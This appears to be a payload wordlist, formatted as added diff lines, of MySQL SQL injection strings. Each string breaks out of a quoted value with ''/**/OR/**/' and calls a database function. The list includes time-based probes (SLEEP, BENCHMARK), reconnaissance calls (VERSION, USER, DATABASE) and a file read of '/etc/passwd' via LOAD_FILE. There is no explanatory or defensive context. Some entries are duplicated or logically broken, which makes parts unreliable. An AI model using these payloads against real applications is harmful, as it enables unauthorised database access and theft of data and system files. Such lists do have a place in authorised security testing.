+'/**/OR/**/OCTET_LENGTH('a')=1
+'/**/OR/**/LOWER('A')='a'
+'/**/OR/**/UPPER('a')='A'
+'/**/OR/**/LCASE('A')='a'
+'/**/OR/**/UCASE('a')='A'
+'/**/OR/**/HEX('a')=61
+'/**/OR/**/UNHEX(61)='a'
+'/**/OR/**/BIN(1)=1
+'/**/OR/**/OCT(1)=1
+'/**/OR/**/CONV(1,10,10)=1
+'/**/OR/**/ABS(1)=1
+'/**/OR/**/SIGN(1)=1
+'/**/OR/**/MOD(1,1)=0
+'/**/OR/**/POW(1,1)=1
+'/**/OR/**/POWER(1,1)=1
+'/**/OR/**/SQRT(1)=1
+'/**/OR/**/EXP(0)=1
+'/**/OR/**/LN(1)=0
+'/**/OR/**/LOG(1)=0
+'/**/OR/**/LOG10(1)=0
+'/**/OR/**/LOG2(1)=0
+'/**/OR/**/SIN(0)=0
+'/**/OR/**/COS(0)=1
+'/**/OR/**/TAN(0)=0
+'/**/OR/**/COT(1)=1
+'/**/OR/**/ASIN(0)=0
+'/**/OR/**/ACOS(1)=0
+'/**/OR/**/ATAN(0)=0
+'/**/OR/**/ATAN2(0,1)=0
+'/**/OR/**/RADIANS(0)=0
+'/**/OR/**/DEGREES(0)=0
+'/**/OR/**/PI()=PI()
+'/**/OR/**/CEIL(1)=1
+'/**/OR/**/CEILING(1)=1
+'/**/OR/**/FLOOR(1)=1
+'/**/OR/**/ROUND(1)=1
+'/**/OR/**/TRUNCATE(1,0)=1
+'/**/OR/**/RAND()=RAND()
+'/**/OR/**/NOW()=NOW()
+'/**/OR/**/CURDATE()=CURDATE()
+'/**/OR/**/CURTIME()=CURTIME()
+'/**/OR/**/UTC_DATE()=UTC_DATE()
+'/**/OR/**/UTC_TIME()=UTC_TIME()
+'/**/OR/**/UTC_TIMESTAMP()=UTC_TIMESTAMP()
+'/**/OR/**/SYSDATE()=SYSDATE()
+'/**/OR/**/CURRENT_DATE()=CURRENT_DATE()
+'/**/OR/**/CURRENT_TIME()=CURRENT_TIME()
+'/**/OR/**/CURRENT_TIMESTAMP()=CURRENT_TIMESTAMP()
+'/**/OR/**/LOCALTIME()=LOCALTIME()
+'/**/OR/**/LOCALTIMESTAMP()=LOCALTIMESTAMP()
+'/**/OR/**/YEAR(NOW())=YEAR(NOW())
+'/**/OR/**/MONTH(NOW())=MONTH(NOW())
+'/**/OR/**/DAY(NOW())=DAY(NOW())
+'/**/OR/**/HOUR(NOW())=HOUR(NOW())
+'/**/OR/**/MINUTE(NOW())=MINUTE(NOW())
+'/**/OR/**/SECOND(NOW())=SECOND(NOW())
+'/**/OR/**/MICROSECOND(NOW())=MICROSECOND(NOW())
+'/**/OR/**/WEEK(NOW())=WEEK(NOW())
+'/**/OR/**/QUARTER(NOW())=QUARTER(NOW())
+'/**/OR/**/DAYOFYEAR(NOW())=DAYOFYEAR(NOW())
+'/**/OR/**/DAYOFMONTH(NOW())=DAYOFMONTH(NOW())
+'/**/OR/**/DAYOFWEEK(NOW())=DAYOFWEEK(NOW())
+'/**/OR/**/WEEKDAY(NOW())=WEEKDAY(NOW())
+'/**/OR/**/YEARWEEK(NOW())=YEARWEEK(NOW())
+'/**/OR/**/LAST_DAY(NOW())=LAST_DAY(NOW())
+'/**/OR/**/TIME_TO_SEC(NOW())=TIME_TO_SEC(NOW())
+'/**/OR/**/SEC_TO_TIME(0)='00:00:00'
+'/**/OR/**/TO_DAYS(NOW())=TO_DAYS(NOW())
+'/**/OR/**/FROM_DAYS(730669)=NOW()
+'/**/OR/**/DATE_FORMAT(NOW(),'%Y')=YEAR(NOW())
+'/**/OR/**/TIME_FORMAT(NOW(),'%H')=HOUR(NOW())
+'/**/OR/**/GET_FORMAT(DATE,'ISO')='%Y-%m-%d'
+'/**/OR/**/MAKEDATE(2024,1)='2024-01-01'
+'/**/OR/**/MAKETIME(0,0,0)='00:00:00'
+'/**/OR/**/UNIX_TIMESTAMP()=UNIX_TIMESTAMP()
+'/**/OR/**/FROM_UNIXTIME(0)='1970-01-01 00:00:00'
+'/**/OR/**/SEC_TO_TIME(UNIX_TIMESTAMP())=NOW()
+'/**/OR/**/ADDDATE(NOW(),0)=NOW()
+'/**/OR/**/DATE_ADD(NOW(),INTERVAL 0 DAY)=NOW()
+'/**/OR/**/SUBDATE(NOW(),0)=NOW()
+'/**/OR/**/DATE_SUB(NOW(),INTERVAL 0 DAY)=NOW()
+'/**/OR/**/ADDTIME(NOW(),'00:00:00')=NOW()
+'/**/OR/**/SUBTIME(NOW(),'00:00:00')=NOW()
+'/**/OR/**/DATEDIFF(NOW(),NOW())=0
+'/**/OR/**/TIMEDIFF(NOW(),NOW())='00:00:00'
+'/**/OR/**/TIMESTAMPDIFF(DAY,NOW(),NOW())=0
+'/**/OR/**/EXTRACT(YEAR FROM NOW())=YEAR(NOW())
+'/**/OR/**/TIMESTAMP(NOW())=NOW()
+'/**/OR/**/DATE(NOW())=CURDATE()
+'/**/OR/**/TIME(NOW())=CURTIME()
+'/**/OR/**/MD5('a')='0cc175b9c0f1b6a831c399e269772661'
+'/**/OR/**/SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'
+'/**/OR/**/SHA2('a',256)=SHA2('a',256)
+'/**/OR/**/AES_ENCRYPT('a','key')=AES_ENCRYPT('a','key')
+'/**/OR/**/AES_DECRYPT(AES_ENCRYPT('a','key'),'key')='a'
+'/**/OR/**/DES_ENCRYPT('a')=DES_ENCRYPT('a')
+'/**/OR/**/DES_DECRYPT(DES_ENCRYPT('a'))='a'
+'/**/OR/**/ENCODE('a','key')=ENCODE('a','key')
+'/**/OR/**/DECODE(ENCODE('a','key'),'key')='a'
+'/**/OR/**/COMPRESS('a')=COMPRESS('a')
+'/**/OR/**/UNCOMPRESS(COMPRESS('a'))='a'
+'/**/OR/**/PASSWORD('a')=PASSWORD('a')
+'/**/OR/**/OLD_PASSWORD('a')=OLD_PASSWORD('a')
+'/**/OR/**/ENCRYPT('a')=ENCRYPT('a')
+'/**/OR/**/CRC32('a')=CRC32('a')
+'/**/OR/**/BIT_COUNT(1)=1
+'/**/OR/**/BIN(1)='1'
+'/**/OR/**/OCT(1)='1'
+'/**/OR/**/HEX(1)='1'
+'/**/OR/**/CONV(1,10,16)='1'
+'/**/OR/**/CONV(1,10,10)='1'
+'/**/OR/**/CAST(1 AS SIGNED)=1
+'/**/OR/**/CONVERT(1,SIGNED)=1
+'/**/OR/**/CAST('1' AS CHAR)='1'
+'/**/OR/**/CONVERT('1',CHAR)='1'
+'/**/OR/**/BINARY 'a'='a'
+'/**/OR/**/COERCIBILITY('a')=COERCIBILITY('a')
+'/**/OR/**/COLLATION('a')=COLLATION('a')
+'/**/OR/**/CHARSET('a')=CHARSET('a')
+'/**/OR/**/ISNULL(NULL)
+'/**/OR/**/IFNULL(1,0)=1
+'/**/OR/**/NULLIF(1,1) IS NULL
+'/**/OR/**/COALESCE(NULL,1)=1
+'/**/OR/**/GREATEST(1,2,3)=3
+'/**/OR/**/LEAST(1,2,3)=1
+'/**/OR/**/INTERVAL(1,0,1,2,3)=1
+'/**/OR/**/ELT(1,'a','b','c')='a'
+'/**/OR/**/FIELD('a','a','b','c')=1
+'/**/OR/**/FIND_IN_SET('a','a,b,c')=1
+'/**/OR/**/MAKE_SET(1,'a','b','c')='a'
+'/**/OR/**/EXPORT_SET(1,'Y','N',',',1)='Y'
+'/**/OR/**/INET_ATON('127.0.0.1')=2130706433
+'/**/OR/**/INET_NTOA(2130706433)='127.0.0.1'
+'/**/OR/**/INET6_ATON('::1')=INET6_ATON('::1')
+'/**/OR/**/INET6_NTOA(INET6_ATON('::1'))='::1'
+'/**/OR/**/IS_IPV4('127.0.0.1')=1
+'/**/OR/**/IS_IPV6('::1')=1
+'/**/OR/**/IS_IPV4_COMPAT(INET6_ATON('::1'))=0
+'/**/OR/**/IS_IPV4_MAPPED(INET6_ATON('::1'))=0
+'/**/OR/**/BENCHMARK(1000000,MD5('a'))
+'/**/OR/**/SLEEP(1)
+'/**/OR/**/GET_LOCK('lock',1)
+'/**/OR/**/RELEASE_LOCK('lock')
+'/**/OR/**/IS_FREE_LOCK('lock')
+'/**/OR/**/IS_USED_LOCK('lock')
+'/**/OR/**/MASTER_POS_WAIT('file',0)
+'/**/OR/**/FOUND_ROWS()
+'/**/OR/**/ROW_COUNT()
+'/**/OR/**/LAST_INSERT_ID()
+'/**/OR/**/VERSION()
+'/**/OR/**/DATABASE()
+'/**/OR/**/USER()
+'/**/OR/**/CURRENT_USER()
+'/**/OR/**/SYSTEM_USER()
+'/**/OR/**/SESSION_USER()
+'/**/OR/**/CONNECTION_ID()
+'/**/OR/**/CHARSET('a')
+'/**/OR/**/COLLATION('a')
+'/**/OR/**/DEFAULT_COLLATION('a')
+'/**/OR/**/ICU_VERSION()
+'/**/OR/**/ROLES_GRAPHML()
+'/**/OR/**/ROW_COUNT()
+'/**/OR/**/SCHEMA()
+'/**/OR/**/UUID()
+'/**/OR/**/UUID_SHORT()
+'/**/OR/**/FOUND_ROWS()
+'/**/OR/**/LAST_INSERT_ID()
+'/**/OR/**/SQL_CALC_FOUND_ROWS
+'/**/OR/**/LOAD_FILE('/etc/passwd')
+'/**/OR/**/QUOTE('a')
+'/**/OR/**/SOUNDEX('a')
+'/**/OR/**/DIFFERENCE('a','a')
+'/**/OR/**/MATCH('a') AGAINST ('a')
+'/**/OR/**/JSON_EXTRACT('{"a":1}','$.a')=1
+'/**/OR/**/JSON_SEARCH('{"a":1}','one','1')='$.a'
+'/**/OR/**/JSON_CONTAINS('{"a":1}','1','$.a')=1
+'/**/OR/**/JSON_CONTAINS_PATH('{"a":1}','one','$.a')=1
+'/**/OR/**/JSON_KEYS('{"a":1}')='["a"]'
+'/**/OR/**/JSON_LENGTH('{"a":1}')=1
+'/**/OR/**/JSON_DEPTH('{"a":1}')=2
+'/**/OR/**/JSON_TYPE('{"a":1}')='OBJECT'
+'/**/OR/**/JSON_VALID('{"a":1}')=1
+'/**/OR/**/JSON_ARRAY(1)='[1]'
+'/**/OR/**/JSON_OBJECT('a',1)='{"a":1}'
+'/**/OR/**/JSON_MERGE('{"a":1}','{"b":2}')='{"a":1,"b":2}'
+'/**/OR/**/JSON_SET('{"a":1}','$.b',2)='{"a":1,"b":2}'
+'/**/OR/**/JSON_INSERT('{"a":1}','$.b',2)='{"a":1,"b":2}'
+'/**/OR/**/JSON_REPLACE('{"a":1}','$.a',2)='{"a":2}'
+'/**/OR/**/JSON_REMOVE('{"a":1}','$.a')='{}'
+'/**/OR/**/GEOMFROMTEXT('POINT(1 1)')
+'/**/OR/**/ASTEXT(GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/ASBINARY(GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/POINT(1,1)
+'/**/OR/**/LINESTRING(POINT(1,1),POINT(2,2))
+'/**/OR/**/POLYGON(LINESTRING(POINT(1,1),POINT(2,2),POINT(3,3),POINT(1,1)))
+'/**/OR/**/MULTIPOINT(POINT(1,1),POINT(2,2))
+'/**/OR/**/MULTILINESTRING(LINESTRING(POINT(1,1),POINT(2,2)))
+'/**/OR/**/MULTIPOLYGON(POLYGON(LINESTRING(POINT(1,1),POINT(2,2),POINT(3,3),POINT(1,1))))
+'/**/OR/**/GEOMETRYCOLLECTION(POINT(1,1))
+'/**/OR/**/ENVELOPE(GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBR(GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBREQUAL(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBRWITHIN(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBRCONTAINS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBROVERLAPS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBRTOUCHES(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBRDISJOINT(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/MBRINTERSECTS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/DIMENSION(GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/NUMINTERIORRINGS(GEOMFROMTEXT('POLYGON((0 0,10 0,10 10,0 10,0 0))'))=0
+'/**/OR/**/NUMGEOMETRIES(GEOMFROMTEXT('MULTIPOINT(1 1,2 2)'))=2
+'/**/OR/**/GLENGTH(GEOMFROMTEXT('LINESTRING(1 1,2 2)'))=1.4142135623730951
+'/**/OR/**/AREA(GEOMFROMTEXT('POLYGON((0 0,10 0,10 10,0 10,0 0))'))=100
+'/**/OR/**/X(POINT(1,2))=1
+'/**/OR/**/Y(POINT(1,2))=2
+'/**/OR/**/STARTPOINT(GEOMFROMTEXT('LINESTRING(1 1,2 2)'))=POINT(1,1)
+'/**/OR/**/ENDPOINT(GEOMFROMTEXT('LINESTRING(1 1,2 2)'))=POINT(2,2)
+'/**/OR/**/ISCLOSED(GEOMFROMTEXT('LINESTRING(1 1,2 2,1 1)'))=1
+'/**/OR/**/ISSIMPLE(GEOMFROMTEXT('LINESTRING(1 1,2 2)'))=1
+'/**/OR/**/ISRING(GEOMFROMTEXT('LINESTRING(1 1,2 2,1 1)'))=1
+'/**/OR/**/ISEMPTY(GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/GEOMETRYTYPE(GEOMFROMTEXT('POINT(1 1)'))='POINT'
+'/**/OR/**/SRID(GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/EQUALS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=1
+'/**/OR/**/DISJOINT(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(2 2)'))=1
+'/**/OR/**/TOUCHES(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/WITHIN(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=1
+'/**/OR/**/OVERLAPS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/CROSSES(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/INTERSECTS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=1
+'/**/OR/**/CONTAINS(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=1
+'/**/OR/**/RELATE(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'),'T*F**FFF*')=1
+'/**/OR/**/DISTANCE(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))=0
+'/**/OR/**/BUFFER(GEOMFROMTEXT('POINT(1 1)'),1)
+'/**/OR/**/CONVEXHULL(GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/INTERSECTION(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/UNION(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/DIFFERENCE(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
+'/**/OR/**/SYMDIFFERENCE(GEOMFROMTEXT('POINT(1 1)'),GEOMFROMTEXT('POINT(1 1)'))
